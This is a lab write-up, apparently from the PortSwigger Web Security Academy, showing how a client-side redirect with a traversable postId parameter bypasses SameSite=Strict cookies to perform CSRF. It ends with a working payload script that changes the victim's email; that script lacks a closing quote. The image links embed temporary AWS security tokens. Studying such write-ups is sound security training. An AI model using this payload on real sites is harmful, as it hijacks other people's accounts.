# SameSite Strict bypass via client-side redirect

### Goal - 

use your exploit server to host an HTML page that uses a CSRF attack to change the viewer’s email address.

### Analysis/Exploitation -

Login as user `wiener`:

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/e634db50-9ad5-48ed-8357-fe079046d56f/2024-02-22_19-57.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466QGQYKGVQ%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T204629Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOT%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD5Du65Pc4WJvwnSj4LuxHK%2FY3az9uqMPVEFtvYOP8atQIhAO64nhWZJulCH6Tbj0vr%2FBmRv%2F1CzwJlHiCyhVtvqm3DKogECKz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQABoMNjM3NDIzMTgzODA1Igx%2By8TozKJbElPdW28q3AN8WdF9b%2Bi2PcKzqIR2kagTETs8wJ8fxI3FvENbs8UHw%2B8qKELEZU%2BhN3Shp8D%2FbdiVqT5V4Eb1PftBKF1yBo96rqdsOAJhFsQBcQ7X7nEAkEiJUd2i5dDtsi9No4uAj%2B5YvJuqtwfMmvXllq0k0eUPFh4DQ%2BgrKyLEzzXwtcMTu7xx51q0377pozArNVfz09IzkzMExxB2pWpVERuwJ2lB9tPULbWgtxj2kMmaffJlX5PiRiuqe%2B%2BSzwDz2NgtGUSreWGA6CpQQep6XkU%2F7Gk21v4zxz9GlFPamJD9%2FmKcwNkqv4UDk02SZx7PsdEG2sh9vptqXFKne%2FZPVPmw9DDKCtoEJMc%2FlJbTuxqAuEm3%2FtkXbUbr6NBDifclQs2iOTh8wGUGT%2BSzJyEeHaONGhPHa265A2mpR0e%2FBqO4z9hiQaM7nVb%2B4der1mddQfbd2b5XUB96R51RTRb5sZTVN%2BY4gIxAIS02CCaYskABsFJinpw52OrrXX2SgdveANBF%2Fq6PlBEUoV02DTbuUuX%2BHn0INUtmDonTRzmZHzH4pYBEk782v%2BgCZYvcEkKwy0oPat3CwUdX2OUtkuTbGVBOYzL3SCgu1pnMKsEY%2FL4cWldu3PglQsCycBOg3ucMojDWyaLUBjqkAb2pjHhpiNLeb5M6OGAcSt235CEsL3mVypINJsvFS2MsSw5dX45DSb73fDGz%2BI07TvkR0l7QXhuWggCl3oMDpXpj8d26sr2sDiJEhX3UbjH%2FsVAV2QA%2F9DbFCemonAt%2BoP2N7QuLA2HnbDqoIssG09dCaen4pEU3hKUQASKxgj4ppyts4CLKvFozxj8Xrl63%2BoROZ4xS8m0aEBqt2uId7AE7Ibke&X-Amz-Signature=65c422ddf7a6ee45d196fbd6dc9afc341f11a196166a1757d2b8e744eb7e390c&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

it’ll set a new session cookie for us: we can see there is a `SameSite` attribute, which is set to `Strict` restriction.

**Inspect the change-email request **

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/bb6cd652-6676-475b-8f9a-32fed3dd743a/2024-02-22_20-05.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466QGQYKGVQ%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T204629Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOT%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD5Du65Pc4WJvwnSj4LuxHK%2FY3az9uqMPVEFtvYOP8atQIhAO64nhWZJulCH6Tbj0vr%2FBmRv%2F1CzwJlHiCyhVtvqm3DKogECKz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQABoMNjM3NDIzMTgzODA1Igx%2By8TozKJbElPdW28q3AN8WdF9b%2Bi2PcKzqIR2kagTETs8wJ8fxI3FvENbs8UHw%2B8qKELEZU%2BhN3Shp8D%2FbdiVqT5V4Eb1PftBKF1yBo96rqdsOAJhFsQBcQ7X7nEAkEiJUd2i5dDtsi9No4uAj%2B5YvJuqtwfMmvXllq0k0eUPFh4DQ%2BgrKyLEzzXwtcMTu7xx51q0377pozArNVfz09IzkzMExxB2pWpVERuwJ2lB9tPULbWgtxj2kMmaffJlX5PiRiuqe%2B%2BSzwDz2NgtGUSreWGA6CpQQep6XkU%2F7Gk21v4zxz9GlFPamJD9%2FmKcwNkqv4UDk02SZx7PsdEG2sh9vptqXFKne%2FZPVPmw9DDKCtoEJMc%2FlJbTuxqAuEm3%2FtkXbUbr6NBDifclQs2iOTh8wGUGT%2BSzJyEeHaONGhPHa265A2mpR0e%2FBqO4z9hiQaM7nVb%2B4der1mddQfbd2b5XUB96R51RTRb5sZTVN%2BY4gIxAIS02CCaYskABsFJinpw52OrrXX2SgdveANBF%2Fq6PlBEUoV02DTbuUuX%2BHn0INUtmDonTRzmZHzH4pYBEk782v%2BgCZYvcEkKwy0oPat3CwUdX2OUtkuTbGVBOYzL3SCgu1pnMKsEY%2FL4cWldu3PglQsCycBOg3ucMojDWyaLUBjqkAb2pjHhpiNLeb5M6OGAcSt235CEsL3mVypINJsvFS2MsSw5dX45DSb73fDGz%2BI07TvkR0l7QXhuWggCl3oMDpXpj8d26sr2sDiJEhX3UbjH%2FsVAV2QA%2F9DbFCemonAt%2BoP2N7QuLA2HnbDqoIssG09dCaen4pEU3hKUQASKxgj4ppyts4CLKvFozxj8Xrl63%2BoROZ4xS8m0aEBqt2uId7AE7Ibke&X-Amz-Signature=40249e1a48a0935db66d583a8c7a1c107edec836749e84cf9f97d95763288fea&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

It doesn’t have a CSRF token parameter, which helps to prevent CSRF (Cross-Site Request Forgery) attack. So, it may be vulnerable to CSRF.

It send a POST request to `/my-account/change-email`, with parameter `email`, `submit`.

**Change request method to GET**

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/740b8a54-220d-463a-8313-c8e9c2486ef8/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466QGQYKGVQ%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T204629Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOT%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD5Du65Pc4WJvwnSj4LuxHK%2FY3az9uqMPVEFtvYOP8atQIhAO64nhWZJulCH6Tbj0vr%2FBmRv%2F1CzwJlHiCyhVtvqm3DKogECKz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQABoMNjM3NDIzMTgzODA1Igx%2By8TozKJbElPdW28q3AN8WdF9b%2Bi2PcKzqIR2kagTETs8wJ8fxI3FvENbs8UHw%2B8qKELEZU%2BhN3Shp8D%2FbdiVqT5V4Eb1PftBKF1yBo96rqdsOAJhFsQBcQ7X7nEAkEiJUd2i5dDtsi9No4uAj%2B5YvJuqtwfMmvXllq0k0eUPFh4DQ%2BgrKyLEzzXwtcMTu7xx51q0377pozArNVfz09IzkzMExxB2pWpVERuwJ2lB9tPULbWgtxj2kMmaffJlX5PiRiuqe%2B%2BSzwDz2NgtGUSreWGA6CpQQep6XkU%2F7Gk21v4zxz9GlFPamJD9%2FmKcwNkqv4UDk02SZx7PsdEG2sh9vptqXFKne%2FZPVPmw9DDKCtoEJMc%2FlJbTuxqAuEm3%2FtkXbUbr6NBDifclQs2iOTh8wGUGT%2BSzJyEeHaONGhPHa265A2mpR0e%2FBqO4z9hiQaM7nVb%2B4der1mddQfbd2b5XUB96R51RTRb5sZTVN%2BY4gIxAIS02CCaYskABsFJinpw52OrrXX2SgdveANBF%2Fq6PlBEUoV02DTbuUuX%2BHn0INUtmDonTRzmZHzH4pYBEk782v%2BgCZYvcEkKwy0oPat3CwUdX2OUtkuTbGVBOYzL3SCgu1pnMKsEY%2FL4cWldu3PglQsCycBOg3ucMojDWyaLUBjqkAb2pjHhpiNLeb5M6OGAcSt235CEsL3mVypINJsvFS2MsSw5dX45DSb73fDGz%2BI07TvkR0l7QXhuWggCl3oMDpXpj8d26sr2sDiJEhX3UbjH%2FsVAV2QA%2F9DbFCemonAt%2BoP2N7QuLA2HnbDqoIssG09dCaen4pEU3hKUQASKxgj4ppyts4CLKvFozxj8Xrl63%2BoROZ4xS8m0aEBqt2uId7AE7Ibke&X-Amz-Signature=d59fd8604f959387373889a79e7f9153e759b67500d4cf73dcb0d9a491354c23&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

It accepts the GET method too


However, in order to exploit CSRF, we first have to **bypass the **`SameSite=Strict`** restriction.**

> 💡 **Strict restriction:**

If a cookie is set with the `SameSite=Strict `attribute, browsers won’t include it in any cross-site requests. You may be able to get around this limitation if you can find a gadget that results in a secondary request within the same site.

One possible gadget is a client-side redirect that dynamically constructs the redirection target using attacker-controllable input like URL parameters.

As far as browsers are concerned, these client-side redirects aren’t really redirects at all; the resulting request is just treated as an ordinary, standalone request. Most importantly, this is a same-site request and, as such, will include all cookies related to the site, regardless of any restrictions that are in place.

If you can manipulate this gadget to elicit a malicious secondary request, this can enable you to bypass any SameSite cookie restrictions completely.

**Find & Understand the Client Side Redirect**

In the home page, we can view different posts And we can leave some comments.

Let’s leave a test comment:

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/62aa176a-6c07-414a-99c8-2dbe3de596c9/2024-02-23_00-31.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466QGQYKGVQ%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T204629Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOT%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD5Du65Pc4WJvwnSj4LuxHK%2FY3az9uqMPVEFtvYOP8atQIhAO64nhWZJulCH6Tbj0vr%2FBmRv%2F1CzwJlHiCyhVtvqm3DKogECKz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQABoMNjM3NDIzMTgzODA1Igx%2By8TozKJbElPdW28q3AN8WdF9b%2Bi2PcKzqIR2kagTETs8wJ8fxI3FvENbs8UHw%2B8qKELEZU%2BhN3Shp8D%2FbdiVqT5V4Eb1PftBKF1yBo96rqdsOAJhFsQBcQ7X7nEAkEiJUd2i5dDtsi9No4uAj%2B5YvJuqtwfMmvXllq0k0eUPFh4DQ%2BgrKyLEzzXwtcMTu7xx51q0377pozArNVfz09IzkzMExxB2pWpVERuwJ2lB9tPULbWgtxj2kMmaffJlX5PiRiuqe%2B%2BSzwDz2NgtGUSreWGA6CpQQep6XkU%2F7Gk21v4zxz9GlFPamJD9%2FmKcwNkqv4UDk02SZx7PsdEG2sh9vptqXFKne%2FZPVPmw9DDKCtoEJMc%2FlJbTuxqAuEm3%2FtkXbUbr6NBDifclQs2iOTh8wGUGT%2BSzJyEeHaONGhPHa265A2mpR0e%2FBqO4z9hiQaM7nVb%2B4der1mddQfbd2b5XUB96R51RTRb5sZTVN%2BY4gIxAIS02CCaYskABsFJinpw52OrrXX2SgdveANBF%2Fq6PlBEUoV02DTbuUuX%2BHn0INUtmDonTRzmZHzH4pYBEk782v%2BgCZYvcEkKwy0oPat3CwUdX2OUtkuTbGVBOYzL3SCgu1pnMKsEY%2FL4cWldu3PglQsCycBOg3ucMojDWyaLUBjqkAb2pjHhpiNLeb5M6OGAcSt235CEsL3mVypINJsvFS2MsSw5dX45DSb73fDGz%2BI07TvkR0l7QXhuWggCl3oMDpXpj8d26sr2sDiJEhX3UbjH%2FsVAV2QA%2F9DbFCemonAt%2BoP2N7QuLA2HnbDqoIssG09dCaen4pEU3hKUQASKxgj4ppyts4CLKvFozxj8Xrl63%2BoROZ4xS8m0aEBqt2uId7AE7Ibke&X-Amz-Signature=5f85d06b5a7b1ff8a2161b743bfe1f7ba7dfa768c82b7ff911469d06327c444b&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/0893e271-ef59-4e3a-8280-b06cd6ea63d2/2024-02-22_21-23.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466QGQYKGVQ%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T204629Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOT%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD5Du65Pc4WJvwnSj4LuxHK%2FY3az9uqMPVEFtvYOP8atQIhAO64nhWZJulCH6Tbj0vr%2FBmRv%2F1CzwJlHiCyhVtvqm3DKogECKz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQABoMNjM3NDIzMTgzODA1Igx%2By8TozKJbElPdW28q3AN8WdF9b%2Bi2PcKzqIR2kagTETs8wJ8fxI3FvENbs8UHw%2B8qKELEZU%2BhN3Shp8D%2FbdiVqT5V4Eb1PftBKF1yBo96rqdsOAJhFsQBcQ7X7nEAkEiJUd2i5dDtsi9No4uAj%2B5YvJuqtwfMmvXllq0k0eUPFh4DQ%2BgrKyLEzzXwtcMTu7xx51q0377pozArNVfz09IzkzMExxB2pWpVERuwJ2lB9tPULbWgtxj2kMmaffJlX5PiRiuqe%2B%2BSzwDz2NgtGUSreWGA6CpQQep6XkU%2F7Gk21v4zxz9GlFPamJD9%2FmKcwNkqv4UDk02SZx7PsdEG2sh9vptqXFKne%2FZPVPmw9DDKCtoEJMc%2FlJbTuxqAuEm3%2FtkXbUbr6NBDifclQs2iOTh8wGUGT%2BSzJyEeHaONGhPHa265A2mpR0e%2FBqO4z9hiQaM7nVb%2B4der1mddQfbd2b5XUB96R51RTRb5sZTVN%2BY4gIxAIS02CCaYskABsFJinpw52OrrXX2SgdveANBF%2Fq6PlBEUoV02DTbuUuX%2BHn0INUtmDonTRzmZHzH4pYBEk782v%2BgCZYvcEkKwy0oPat3CwUdX2OUtkuTbGVBOYzL3SCgu1pnMKsEY%2FL4cWldu3PglQsCycBOg3ucMojDWyaLUBjqkAb2pjHhpiNLeb5M6OGAcSt235CEsL3mVypINJsvFS2MsSw5dX45DSb73fDGz%2BI07TvkR0l7QXhuWggCl3oMDpXpj8d26sr2sDiJEhX3UbjH%2FsVAV2QA%2F9DbFCemonAt%2BoP2N7QuLA2HnbDqoIssG09dCaen4pEU3hKUQASKxgj4ppyts4CLKvFozxj8Xrl63%2BoROZ4xS8m0aEBqt2uId7AE7Ibke&X-Amz-Signature=5490fd873acec76452ed9abcbca21b573853e05e85352a272cf3d9abc93e0b61&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

After we send the request, it’ll fetch a JavaScript file:

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/fb9ef1eb-a927-412b-96dc-23e4328e074a/2024-02-23_00-32.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466QGQYKGVQ%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T204629Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOT%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD5Du65Pc4WJvwnSj4LuxHK%2FY3az9uqMPVEFtvYOP8atQIhAO64nhWZJulCH6Tbj0vr%2FBmRv%2F1CzwJlHiCyhVtvqm3DKogECKz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQABoMNjM3NDIzMTgzODA1Igx%2By8TozKJbElPdW28q3AN8WdF9b%2Bi2PcKzqIR2kagTETs8wJ8fxI3FvENbs8UHw%2B8qKELEZU%2BhN3Shp8D%2FbdiVqT5V4Eb1PftBKF1yBo96rqdsOAJhFsQBcQ7X7nEAkEiJUd2i5dDtsi9No4uAj%2B5YvJuqtwfMmvXllq0k0eUPFh4DQ%2BgrKyLEzzXwtcMTu7xx51q0377pozArNVfz09IzkzMExxB2pWpVERuwJ2lB9tPULbWgtxj2kMmaffJlX5PiRiuqe%2B%2BSzwDz2NgtGUSreWGA6CpQQep6XkU%2F7Gk21v4zxz9GlFPamJD9%2FmKcwNkqv4UDk02SZx7PsdEG2sh9vptqXFKne%2FZPVPmw9DDKCtoEJMc%2FlJbTuxqAuEm3%2FtkXbUbr6NBDifclQs2iOTh8wGUGT%2BSzJyEeHaONGhPHa265A2mpR0e%2FBqO4z9hiQaM7nVb%2B4der1mddQfbd2b5XUB96R51RTRb5sZTVN%2BY4gIxAIS02CCaYskABsFJinpw52OrrXX2SgdveANBF%2Fq6PlBEUoV02DTbuUuX%2BHn0INUtmDonTRzmZHzH4pYBEk782v%2BgCZYvcEkKwy0oPat3CwUdX2OUtkuTbGVBOYzL3SCgu1pnMKsEY%2FL4cWldu3PglQsCycBOg3ucMojDWyaLUBjqkAb2pjHhpiNLeb5M6OGAcSt235CEsL3mVypINJsvFS2MsSw5dX45DSb73fDGz%2BI07TvkR0l7QXhuWggCl3oMDpXpj8d26sr2sDiJEhX3UbjH%2FsVAV2QA%2F9DbFCemonAt%2BoP2N7QuLA2HnbDqoIssG09dCaen4pEU3hKUQASKxgj4ppyts4CLKvFozxj8Xrl63%2BoROZ4xS8m0aEBqt2uId7AE7Ibke&X-Amz-Signature=1647c0458247bc58cc2355b613062d4dc9cfd36f5ed3e51d6b35b34b02486559&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

When we go to `/post/comment/confirmation`, it’ll run that JavaScript:

- After 3 seconds, redirect user to `/post/<postId>`
![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/96991d29-353c-4165-9378-acf6cd0d9507/2024-02-22_21-25.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466QGQYKGVQ%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T204629Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOT%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD5Du65Pc4WJvwnSj4LuxHK%2FY3az9uqMPVEFtvYOP8atQIhAO64nhWZJulCH6Tbj0vr%2FBmRv%2F1CzwJlHiCyhVtvqm3DKogECKz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQABoMNjM3NDIzMTgzODA1Igx%2By8TozKJbElPdW28q3AN8WdF9b%2Bi2PcKzqIR2kagTETs8wJ8fxI3FvENbs8UHw%2B8qKELEZU%2BhN3Shp8D%2FbdiVqT5V4Eb1PftBKF1yBo96rqdsOAJhFsQBcQ7X7nEAkEiJUd2i5dDtsi9No4uAj%2B5YvJuqtwfMmvXllq0k0eUPFh4DQ%2BgrKyLEzzXwtcMTu7xx51q0377pozArNVfz09IzkzMExxB2pWpVERuwJ2lB9tPULbWgtxj2kMmaffJlX5PiRiuqe%2B%2BSzwDz2NgtGUSreWGA6CpQQep6XkU%2F7Gk21v4zxz9GlFPamJD9%2FmKcwNkqv4UDk02SZx7PsdEG2sh9vptqXFKne%2FZPVPmw9DDKCtoEJMc%2FlJbTuxqAuEm3%2FtkXbUbr6NBDifclQs2iOTh8wGUGT%2BSzJyEeHaONGhPHa265A2mpR0e%2FBqO4z9hiQaM7nVb%2B4der1mddQfbd2b5XUB96R51RTRb5sZTVN%2BY4gIxAIS02CCaYskABsFJinpw52OrrXX2SgdveANBF%2Fq6PlBEUoV02DTbuUuX%2BHn0INUtmDonTRzmZHzH4pYBEk782v%2BgCZYvcEkKwy0oPat3CwUdX2OUtkuTbGVBOYzL3SCgu1pnMKsEY%2FL4cWldu3PglQsCycBOg3ucMojDWyaLUBjqkAb2pjHhpiNLeb5M6OGAcSt235CEsL3mVypINJsvFS2MsSw5dX45DSb73fDGz%2BI07TvkR0l7QXhuWggCl3oMDpXpj8d26sr2sDiJEhX3UbjH%2FsVAV2QA%2F9DbFCemonAt%2BoP2N7QuLA2HnbDqoIssG09dCaen4pEU3hKUQASKxgj4ppyts4CLKvFozxj8Xrl63%2BoROZ4xS8m0aEBqt2uId7AE7Ibke&X-Amz-Signature=bada92e7e3ae0fbb4ac726e2343073508388cc732b127785d836581231c21bc3&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

However, the GET parameter `postId` is fully under attacker’s control!

**Now, what if I change the path to **`/my-account`** via path traversal?**

- Start crafting our payload
```html
/post/comment/confirmation?postId=6
```

- Change payload to redirect to my-account page
```html
/post/comment/confirmation?postId=my-account/
```

- Add a traversal attack to our payload
```html
/post/comment/confirmation?postId=../my-account/
```

- Modify payload to change our email
```html
/post/comment/confirmation?postId=../my-account/change-email?email=test@wiener.com&submit=1
```

- URL encode ampersand `&` may its not able to determine when our mail ends
```html
/post/comment/confirmation?postId=../my-account/change-email?email=test@wiener.com%26submit=1
```

- Craft out final payload
```html
<script>
window. location = "https://0ad1003704e4d04e8077d6250056008f.web-security-academy.net/post/comment/confirmation?postId=../my-account/change-email?email=test@wiener.com%26submit=1
</script>
```

- Deliver our final payload to the victim
